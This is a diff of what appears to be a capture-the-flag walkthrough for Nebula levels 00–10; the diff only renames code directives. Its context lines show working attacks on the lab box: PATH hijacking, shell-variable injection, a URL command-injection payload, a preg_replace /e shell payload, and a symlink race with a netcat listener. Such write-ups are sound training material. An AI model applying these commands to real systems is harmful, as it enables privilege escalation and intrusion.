@@ -30,7 +30,7 @@ Level 00 ##
 So somewhere from the root directory is a file will run as the flag00 user. As stated you can either look for it, or
 use :code:`find` to search for it. I chose to do a little bit of both. Running :code:`find` from the root of a system can take some time so I chose to take a look first. Amongst the usual directories at linux root level is a :code:`rofs` directory. So let's take a look inside.
 
-.. code-block:: console
+.. code:: console
 
 	
 	flag00@nebula:/rofs$ ls
@@ -40,7 +40,7 @@ use :code:`find` to search for it. I chose to do a little bit of both. Running :
 
 Looks the same, but let's run a find in here.
 
-.. code-block:: console
+.. code:: console
 
 	
 	level00@nebula:/rofs$ find -user flag00 -print 2> /dev/null
@@ -53,7 +53,7 @@ Looks the same, but let's run a find in here.
 
 There's the usual stuff, but there's also :code:`./bin/.../flag00`. If you run this you can get the flag:
 
-.. code-block:: console
+.. code:: console
 
 	
 	level00@nebula:/rofs$ ./bin/.../flag00
@@ -67,7 +67,7 @@ Level 01 ##
 
     There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? 
 
-.. code-block:: c
+.. code:: c
 
 	
 	#include <stdlib.h>
@@ -92,7 +92,7 @@ Level 01 ##
 
 So let's see about this vulnerability. It doesn't accept user input, but luckily there's only one place where it actually runs anything, so that makes it easier to narrow down where its weakness is. The :code:`system` call executes an :code:`echo` but there's a small oversight. It calls :code:`echo` without an explicit path, can you see where this is going? As :code:`flag01` runs as user :code:`flag01`, anything it executes will also run under that user.
 
-.. code-block:: console
+.. code:: console
 
 	
 	level01@nebula:/home/flag01$ mkdir /tmp/mybin
@@ -111,7 +111,7 @@ Level 02 ##
 
 > There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? 
 
-.. code-block:: C
+.. code:: C
 
 	
 	#include <stdlib.h>
@@ -143,7 +143,7 @@ Level 02 ##
 
 This is very similar to *Level01* but this time they seem to have patched the system call. However this time they've added something to the statement that we have control over. Look at line 22 and think about how we can make use of that.
 
-.. code-block:: console
+.. code:: console
 
 	level02@nebula:/home/flag02$ export USER='"";getflag'
 	level02@nebula:/home/flag02$ ./flag02
@@ -160,7 +160,7 @@ Level 03 ##
 
 So first things first let's take a look at that crontab
 
-.. code-block:: console
+.. code:: console
 
 	level03@nebula:/home/flag03$ cat writable.sh
 	#!/bin/sh
@@ -172,7 +172,7 @@ So first things first let's take a look at that crontab
 
 Ok, so it will take a shell script in the :code:`writeable.d` directory, execute it and then delete it. Luckily the directory is world read/write, allowing us to add out own script. As the crontab will run the script as the :code:`flag03` user, we might as well just run the :code:`getflag` from it. We'll capture some output to make sure it worked.
 
-.. code-block:: console
+.. code:: console
 
 	level03@nebula:/home/flag03$ cat writeable.d/getit
 	/bin/getflag > /tmp/gotit
@@ -185,7 +185,7 @@ Level 04 ##
 
     This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :) 
 
-.. code-block:: C
+.. code:: C
 
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -225,7 +225,7 @@ Level 04 ##
 
 Ok, so let's take a look at what happens when we run the file
 
-.. code-block:: console
+.. code:: console
 
 	level04@nebula:/home/flag04$ ls
 	flag04  token
@@ -238,7 +238,7 @@ So we can't access token. Looking at the code there's a check to see if the file
 
 Then get the flag (some ssh output cut for brevity)
 
-.. code-block:: console
+.. code:: console
 
 	level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/myfile
 	level04@nebula:/home/flag04$ ./flag04 /tmp/myfile
@@ -259,7 +259,7 @@ Level 05 ##
 
 Ok, let's do that
 
-.. code-block:: console
+.. code:: console
 
 	level05@nebula:~$ cd ~flag05
 	level05@nebula:/home/flag05$ ls -la
@@ -274,7 +274,7 @@ Ok, let's do that
 
 That *backup* directory looks like our target
 
-.. code-block:: console
+.. code:: console
 
 	level05@nebula:/home/flag05$ cd .backup/
 	level05@nebula:/home/flag05/.backup$ ls -la
@@ -290,7 +290,7 @@ That *backup* directory looks like our target
 
 Right so let's use these keys to login as *flag05*. 
 
-.. code-block:: console
+.. code:: console
 
 	level05@nebula:/home/flag05/.backup$ ssh -i /tmp/.ssh/id_rsa flag05@localhost
 	
@@ -304,14 +304,14 @@ Level 06 ##
 
 To cut a long story short, the way the password is stored for this user is not the same as for the other users. In older * nix systems the password was stored inside the :code:`/etc/passwd` file. So let's take a look:
 
-.. code-block:: console
+.. code:: console
 
 	level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
 	flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
 
 Yep, there's the encrypted password. Grab that line and run it through John The Ripper
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > nebula.txt
 	root@kali:~# john nebula.txt  -show
@@ -321,7 +321,7 @@ Yep, there's the encrypted password. Grab that line and run it through John The 
 
 That's that, now back on the nebula box
 
-.. code-block:: console
+.. code:: console
 
 	level06@nebula:/home/flag06$ ssh flag06@localhost
 	
@@ -335,7 +335,7 @@ Level 07 ##
 
     The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. 
 
-.. code-block:: perl
+.. code:: perl
 
 	#!/usr/bin/perl
 	
@@ -365,7 +365,7 @@ Basically I am pinging the same host. The webpage will display the output of the
 
 We can't change the ping call, but we have control over what gets passed to the command. Let's craft a special URL
 
-.. code-block:: console
+.. code:: console
 
 	$> curl http://192.168.56.102:7007/index.cgi?Host=127.0.0.1%20%26%26%20getflag
 	<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
@@ -387,7 +387,7 @@ Level 08 ##
 
 Let's take a look then
 
-.. code-block:: console
+.. code:: console
 
 	level08@nebula:/home/flag08$ ls -la
 	total 18
@@ -401,7 +401,7 @@ Let's take a look then
 
 The only interesting file that's readable here is :code:`capture.pcap`. Let's copy it out and use *Wireshark* to take a look at it.
 
-.. code-block:: console
+.. code:: console
 
 	$> scp level08@192.168.56.102:/home/flag08/capture.pcap .
 	
@@ -415,7 +415,7 @@ Once in Wireshark we can see a TCP stream. Right click on one of the entries and
 
 So....
 
-.. code-block:: console
+.. code:: console
 
 	level08@nebula:/home/flag08$ ssh flag08@localhost
 	
@@ -429,7 +429,7 @@ Level 09 ##
 
     There's a C setuid wrapper for some vulnerable PHP code... 
 
-.. code-block:: php
+.. code:: php
 
 	<?php
 	
@@ -460,7 +460,7 @@ Level 09 ##
 
 Let's run it to see what it actually does.
 
-.. code-block:: console
+.. code:: console
 
 	level09@nebula:/home/flag09$ echo [email mail@test.com] > /tmp/test.txt
 	level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
@@ -470,7 +470,7 @@ So the vulnerable part here is the `preg_replace` with the *e* flag. For informa
 
 So there's a few ways we can exploit this. We basically need to pass a command to the script that will get executed in the :code:`preg_replace`. Let's try to simply get a shell as the *flag09* user and get our flag.
 
-.. code-block:: console
+.. code:: console
 
 	level09@nebula:/home/flag09$ echo '[email ${${@system('sh')}}]' > /tmp/test.txt
 	level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
@@ -484,7 +484,7 @@ Level 10 ##
 
     The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call. 
 
-.. code-block:: C
+.. code:: C
 
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -567,13 +567,13 @@ So ideally we want to create a symlink to a file we own when the :code:`access` 
 
 You will need two shells (both on nebula is fine but optional); call them termA and termB. So in termB startup a listening netcat on the relevant port
 
-.. code-block:: console
+.. code:: console
 
 	level10@nebula:~$ nc -l 18211
 
 in termA we create our symlink, then run the command along with a command to update the symlink
 
-.. code-block:: console
+.. code:: console
 
 	level10@nebula:/home/flag10$ touch /tmp/mytoken
 	level10@nebula:/home/flag10$ ln -fs /tmp/mytoken /tmp/getme
@@ -584,7 +584,7 @@ in termA we create our symlink, then run the command along with a command to upd
 
 Meanwhile, back in termB
 
-.. code-block:: console
+.. code:: console
 
 	.oO Oo.
 	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
